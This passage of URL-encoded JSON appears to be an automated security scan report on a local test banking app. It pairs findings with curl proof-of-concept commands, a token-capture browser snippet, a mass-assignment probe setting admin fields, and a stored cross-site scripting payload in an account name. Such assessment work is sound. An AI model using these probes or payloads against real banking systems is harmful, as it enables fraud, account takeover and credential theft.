5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Profile%20and%20authentication%20APIs%20expose%20password%20hashes%22%2C%22description%22%3A%22Authenticated%20responses%20from%20the%20profile%20API%20include%20the%20internal%20password_hash%20field.%20The%20captured%20evidence%20also%20records%20password-hash%20exposure%20in%20an%20account%20response%2C%20including%20an%20MD5%20hash%20for%20a%20newly%20registered%20user.%22%2C%22impact%22%3A%22Exposure%20of%20password%20hashes%20allows%20anyone%20who%20obtains%20the%20response%20through%20a%20compromised%20client%2C%20browser%20extension%2C%20or%20logging%20system%20to%20attempt%20offline%20password%20cracking.%20MD5%20password%20hashes%20are%20particularly%20inexpensive%20to%20crack%20and%20may%20expose%20reused%20passwords.%22%2C%22likelihood%22%3A%22Every%20authenticated%20request%20to%20the%20observed%20profile%20endpoint%20returned%20the%20password_hash%20field.%20Exploitation%20requires%20access%20to%20an%20authenticated%20response%20or%20another%20system%20that%20captures%20it.%22%2C%22recommendation%22%3A%22Remove%20password_hash%20from%20all%20profile%2C%20registration%2C%20and%20authentication%20responses.%20Define%20explicit%20allowlists%20of%20fields%20that%20each%20public%20serializer%20may%20return%2C%20and%20add%20automated%20tests%20confirming%20that%20credential%20fields%20never%20appear%20in%20API%20responses.%20Replace%20MD5%20password%20storage%20with%20a%20modern%20password-hashing%20algorithm%20configured%20with%20an%20appropriate%20work%20factor.%22%2C%22cvss_score%22%3A6.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%22%2C%22evidence%22%3A%22An%20authenticated%20GET%20request%20to%20%2Fapi%2Fprofile%20returned%20HTTP%20200%20with%20the%20password_hash%20value%20%5C%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%5C%22%20in%20the%20profile%20JSON.%20The%20captured%20result%20also%20states%20that%20a%20disposable%20weak-password%20account%20response%20exposed%20its%20MD5%20password%20hash.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fprofile%20using%20configured_primary.%22%2C%22response_evidence%22%3A%22HTTP%20200%20profile%20JSON%20included%20%5C%22password_hash%5C%22%3A%5C%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%5C%5C%2F.og%5C%5C%2Fat2.uheWG%5C%5C%2Figi%5C%22.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Live%20authenticated%20requests%20reproduced%20the%20exposure%20for%20two%20separate%20accounts.%20The%20weak_test%20profile%20returned%20the%20account-specific%20MD5%20value%200cc175b9c0f1b6a831c399e269772661%2C%20while%20admin_test%20returned%20the%20exact%20bcrypt%20value%20cited%20by%20the%20scanner%2C%20so%20the%20field%20is%20neither%20a%20static%20placeholder%20nor%20an%20isolated%20capture%20artifact.%20The%20response%20serializes%20the%20internal%20password_hash%20field%20as%20part%20of%20normal%20profile%20data%2C%20and%20no%20innocent%20explanation%20remained%20after%20testing%20those%20alternatives.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Registration%20permits%20one-character%20passwords%22%2C%22description%22%3A%22The%20customer%20registration%20endpoint%20at%20%2Fapi%2Fauth%2Fregister%20accepts%20passwords%20without%20enforcing%20a%20meaningful%20minimum%20length.%22%2C%22impact%22%3A%22Users%20can%20create%20accounts%20with%20trivially%20guessable%20passwords%2C%20increasing%20the%20risk%20of%20account%20compromise%20through%20password%20guessing%2C%20brute-force%20attacks%2C%20and%20password%20spraying.%22%2C%22likelihood%22%3A%22A%20customer%20account%20was%20successfully%20registered%20with%20the%20single-character%20password%20%5C%22a%5C%22%2C%20and%20the%20same%20credentials%20were%20immediately%20accepted%20by%20the%20login%20endpoint.%22%2C%22recommendation%22%3A%22Enforce%20an%20appropriate%20minimum%20password%20length%20and%20reject%20known%20compromised%20passwords.%20Support%20long%20passphrases%20and%20password%20managers%2C%20provide%20clear%20password%20guidance%2C%20and%20add%20login%20rate%20limiting%20and%20multi-factor%20authentication.%22%2C%22cvss_score%22%3A5.3%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22POST%20%2Fapi%2Fauth%2Fregister%20created%20customer%20account%20ID%2017%20using%20email%20aespa.weak.20260908%40example.com%20and%20the%20password%20%5C%22a%5C%22.%20A%20subsequent%20POST%20%2Fapi%2Fauth%2Flogin%20with%20the%20same%20credentials%20returned%20HTTP%20200%20and%20the%20message%20%5C%22Login%20successful%5C%22.%22%2C%22request_evidence%22%3A%22Registration%20used%20email%20aespa.weak.20260908%40example.com%20and%20password%20a.%20The%20confirmation%20login%20used%20the%20same%20credentials.%22%2C%22response_evidence%22%3A%22Login%20HTTP%20200%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22user%5C%22%3A%7B%5C%22id%5C%22%3A17%2C%5C%22email%5C%22%3A%5C%22aespa.weak.20260908%40example.com%5C%22%2C...%7D%7D%2C%5C%22message%5C%22%3A%5C%22Login%20successful%5C%22%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Replaying%20the%20reported%20credentials%20against%20the%20existing%20account%20returned%20HTTP%20200%2C%20user%20ID%2017%2C%20and%20%5C%22Login%20successful%5C%22%2C%20so%20the%20one-character%20password%20is%20still%20valid%20for%20an%20active%20customer%20account.%20I%20also%20compared%20registration%20requests%20using%20the%20existing%20email%2C%20but%20duplicate-email%20handling%20runs%20before%20password%20validation%2C%20so%20it%20supplied%20no%20benign%20explanation.%20No%20account-verification%20or%20restricted-account%20behavior%20appeared%20in%20the%20successful%20login%20response.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22email%5C%22%3A%5C%22aespa.weak.20260908%40example.com%5C%22%2C%5C%22password%5C%22%3A%5C%22a%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A04%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Users%20can%20create%20funded%20credit-card%20accounts%20without%20an%20approval%20process%22%2C%22description%22%3A%22A%20newly%20registered%20user%20could%20request%20account_type%20credit_card%20and%20immediately%20receive%20an%20active%20card%20account%20with%20a%2025000%20AUD%20balance%20or%20limit.%22%2C%22impact%22%3A%22An%20attacker%20could%20create%20unauthorized%20credit%20products%20and%20obtain%20usable%20card%20credentials%2C%20causing%20direct%20financial%20loss.%22%2C%22likelihood%22%3A%22High.%20A%20single%20authenticated%20request%20from%20the%20disposable%20account%20created%20the%20product%20without%20any%20observed%20eligibility%20or%20approval%20step.%22%2C%22recommendation%22%3A%22Restrict%20credit-product%20creation%20to%20an%20approved%20server-side%20workflow.%20Enforce%20eligibility%2C%20limits%2C%20authorization%2C%20audit%20logging%2C%20and%20manual%20or%20automated%20approval%20before%20activation.%22%2C%22cvss_score%22%3A6.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%22%2C%22evidence%22%3A%22POSTing%20account_type%20credit_card%20as%20the%20weak%20test%20user%20returned%20201%20with%20an%20active%20card%2C%20a%2025000.00%20credit%20limit%2C%20full%20card%20number%2C%20expiry%2C%20and%20CVV.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%5Cnuse_session%3A%20configured_primary%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22X-HTTP-Method-Override%5C%22%3A%20%5C%22DELETE%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2012%3A59%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%201011%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Everyday%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%223450.75%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Savings%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2218900.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000003%5C%22%2C%5C%22account_type%5C%22%3A%5C%22loan%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Home%20Loan%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%22-285000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A51%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000004%5C%22%2C%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Platinum%20Credit%20Card%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2225000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%2C%5C%22card_number%5C%22%3A%5C%224532015001345674%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2208%5C%5C%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22842%5C%22%2C%5C%22credit_limit%5C%22%3A%5C%2225000.00%5C%22%7D%2C%7B%5C%22id%5C%22%3A101%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210593296%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%5C%5C%2F%5C%5C%2F%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%220.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%5D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%5Cnuse_session%3A%20configured_primary%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22X-HTTP-Method-Override%5C%22%3A%20%5C%22DELETE%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2012%3A59%3A10%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%201011%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Everyday%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%223450.75%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Savings%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2218900.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000003%5C%22%2C%5C%22account_type%5C%22%3A%5C%22loan%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Home%20Loan%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%22-285000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A51%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000004%5C%22%2C%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Platinum%20Credit%20Card%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2225000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%2C%5C%22card_number%5C%22%3A%5C%224532015001345674%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2208%5C%5C%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22842%5C%22%2C%5C%22credit_limit%5C%22%3A%5C%2225000.00%5C%22%7D%2C%7B%5C%22id%5C%22%3A101%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210593296%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%5C%5C%2F%5C%5C%2F%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%220.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%5D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20first%20replay%20with%20only%20account_type%20was%20rejected%20because%20account_name%20is%20required%2C%20so%20I%20retried%20with%20that%20required%20field.%20The%20valid%20request%20from%20zoe_test%20returned%20201%20and%20immediately%20created%20an%20active%20credit-card%20account%20with%20a%2025%2C000.00%20balance%20and%20credit%20limit%20plus%20card%20credentials%3B%20a%20second%20supplied%20session%20produced%20the%20same%20result.%20Existing%20seeded%20cards%20could%20explain%20the%20initial%20GET%2C%20but%20they%20do%20not%20explain%20two%20successful%20user-initiated%20creations%2C%20and%20no%20approval%20state%20or%20approval%20step%20was%20required.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Validation%20Probe%20Card%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**zoe_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20normal%20test%20user%20used%20for%20validation%20and%20copy%20that%20user's%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20Network%20panel%20or%20from%20localStorage%2FsessionStorage.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Profile%20and%20authentication%20APIs%20expose%20password%20hashes%22%2C%22description%22%3A%22The%20registration%20endpoint%20includes%20the%20new%20user's%20password_hash%20in%20its%20JSON%20response.%20The%20returned%20value%20is%20a%2032-character%20hexadecimal%20digest%2C%20which%20also%20suggests%20weak%20legacy%20password%20hashing.%22%2C%22impact%22%3A%22An%20attacker%20can%20inspect%20the%20application's%20password-hashing%20output%20and%20use%20it%20to%20identify%20or%20test%20the%20hashing%20scheme.%20Exposure%20of%20hashes%20for%20other%20users%20through%20similar%20serialization%20would%20enable%20offline%20password%20cracking.%22%2C%22likelihood%22%3A%22Any%20unauthenticated%20user%20can%20trigger%20the%20disclosure%20by%20registering%20an%20account.%20This%20probe%20only%20confirmed%20disclosure%20of%20the%20attacker's%20own%20hash.%22%2C%22recommendation%22%3A%22Remove%20password_hash%20and%20other%20authentication%20secrets%20from%20all%20API%20response%20schemas.%20Store%20passwords%20using%20Argon2id%2C%20bcrypt%2C%20or%20scrypt%20with%20unique%20salts%2C%20and%20review%20existing%20hashes%20for%20migration.%22%2C%22cvss_score%22%3A5.3%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22A%20POST%20containing%20the%20known%20password%20%5C%22valid-enough-password%5C%22%20returned%20HTTP%20201%20and%20included%20%5C%22password_hash%5C%22%3A%5C%22cc3fb6e688cab1cfd280f4a068f71573%5C%22%20in%20the%20user%20object.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22invalid-email%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22valid-enough-password%5C%22%2C%20%5C%22first_name%5C%22%3A%20%5C%22Integrity%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Probe%5C%22%2C%20%5C%22role%5C%22%3A%20%5C%22admin%5C%22%2C%20%5C%22is_admin%5C%22%3A%20true%2C%20%5C%22balance%5C%22%3A%20999999%2C%20%5C%22verified%5C%22%3A%20true%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20422%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A06%3A18%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20154%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22VALIDATION_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22Validation%20failed%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22email%5C%22%3A%5B%5C%22The%20email%20field%20must%20be%20a%20valid%20email%20address.%5C%22%5D%7D%7D%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22invalid-email%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22valid-enough-password%5C%22%2C%20%5C%22first_name%5C%22%3A%20%5C%22Integrity%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Probe%5C%22%2C%20%5C%22role%5C%22%3A%20%5C%22admin%5C%22%2C%20%5C%22is_admin%5C%22%3A%20true%2C%20%5C%22balance%5C%22%3A%20999999%2C%20%5C%22verified%5C%22%3A%20true%7D%22%2C%22response_evidence%22%3A%22Status%3A%20422%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A06%3A18%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20154%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22VALIDATION_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22Validation%20failed%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22email%5C%22%3A%5B%5C%22The%20email%20field%20must%20be%20a%20valid%20email%20address.%5C%22%5D%7D%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20report%20correlates%20two%20different%20outcomes%3A%20its%20displayed%20request%20uses%20the%20invalid%20email%20%5C%22invalid-email%5C%22%20and%20the%20live%20endpoint%20returns%20422%20before%20creating%20a%20user%2C%20while%20the%20claimed%20201%2Fhash%20response%20is%20not%20shown%20for%20that%20request.%20A%20duplicate-safe%20POST%20using%20the%20known%20existing%20address%20amelia.chen%40example.com%20returns%20409%20with%20only%20a%20generic%20error%20and%20no%20user%20object%20or%20password_hash%3B%20the%20related%20profile%20paths%20tested%20are%20also%20not%20live%20routes.%20The%20concrete%20benign%20explanation%20is%20a%20scanner%20evidence-correlation%20or%20stale-response%20error%2C%20so%20the%20supplied%20evidence%20does%20not%20establish%20password-hash%20exposure%20at%20this%20endpoint.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Banking%20page%20lacks%20browser%20security%20headers%22%2C%22description%22%3A%22The%20response%20for%20the%20banking%20page%20omits%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20Referrer-Policy%2C%20and%20Strict-Transport-Security.%20The%20page%20also%20loads%20executable%20code%20from%20cdn.tailwindcss.com%20and%20uses%20inline%20scripts%20and%20event%20handlers.%22%2C%22impact%22%3A%22The%20missing%20framing%20restrictions%20may%20allow%20clickjacking.%20The%20lack%20of%20a%20Content%20Security%20Policy%20and%20use%20of%20inline%20or%20third-party%20scripts%20could%20increase%20the%20impact%20of%20a%20separate%20content%20injection%20flaw.%20The%20disclosed%20Apache%20version%20provides%20additional%20reconnaissance%20information.%22%2C%22likelihood%22%3A%22The%20missing%20headers%20were%20observed%20on%20an%20anonymous%20request%20to%20the%20banking%20page%20and%20affect%20clients%20whenever%20this%20response%20is%20served.%20Exploitation%20of%20most%20impacts%20requires%20additional%20conditions%2C%20such%20as%20user%20interaction%20or%20a%20separate%20injection%20flaw.%22%2C%22recommendation%22%3A%22Add%20a%20restrictive%20Content-Security-Policy%20using%20nonces%20or%20hashes%20and%20a%20frame-ancestors%20directive.%20Set%20X-Content-Type-Options%20to%20nosniff%20and%20configure%20an%20appropriate%20Referrer-Policy.%20Enable%20HSTS%20when%20the%20application%20is%20served%20over%20HTTPS.%20Remove%20inline%20scripts%20and%20event%20handlers%20where%20practical%2C%20pin%20or%20self-host%20third-party%20scripts%2C%20and%20suppress%20detailed%20server%20version%20information.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fbanking%2F%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20to%20%2Fbanking%2F%20returned%20HTTP%20200%20with%20Content-Type%3A%20text%2Fhtml%20and%20Server%3A%20Apache%2F2.4.68%20(Unix).%20The%20response%20omitted%20Content-Security-Policy%2C%20Strict-Transport-Security%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20and%20Referrer-Policy.%20The%20HTML%20referenced%20https%3A%2F%2Fcdn.tailwindcss.com%2C%20included%20an%20inline%20tailwind.config%20script%2C%20and%20contained%20multiple%20inline%20onclick%20and%20onsubmit%20handlers.%22%2C%22request_evidence%22%3A%22Anonymous%20GET%20%2Fbanking%2F.%22%2C%22response_evidence%22%3A%22HTTP%20200%20headers%20exposed%20Server%3A%20Apache%2F2.4.68%20(Unix)%20but%20omitted%20CSP%2C%20HSTS%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20and%20Referrer-Policy.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20fresh%20direct%20anonymous%20GET%20returned%20200%20from%20Apache%20with%20none%20of%20the%20five%20reported%20response%20headers.%20The%20returned%20HTML%20also%20had%20no%20meta%20CSP%20or%20Referrer-Policy%20equivalent%2C%20while%20it%20loaded%20https%3A%2F%2Fcdn.tailwindcss.com%20and%20included%20an%20inline%20Tailwind%20configuration%20script.%20This%20rules%20out%20the%20main%20innocent%20explanations%20of%20stale%20scanner%20evidence%2C%20proxy-only%20stripping%2C%20or%2